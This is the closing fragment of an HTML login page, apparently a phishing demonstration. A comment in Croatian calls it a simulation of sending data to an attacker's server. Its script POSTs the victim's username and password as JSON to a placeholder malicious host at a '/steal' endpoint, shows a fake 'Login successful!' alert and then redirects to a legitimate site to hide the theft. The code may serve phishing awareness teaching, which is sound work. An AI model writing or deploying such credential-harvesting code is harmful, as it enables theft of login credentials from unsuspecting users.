        // Simuliraj slanje podataka na napadačev server
        fetch('http://your-malicious-server.com/steal', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        })
        .then(response => {
            alert('Login successful!');
            window.location.href = 'http://legitimate-website.com';
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
</script>

</body>
</html>
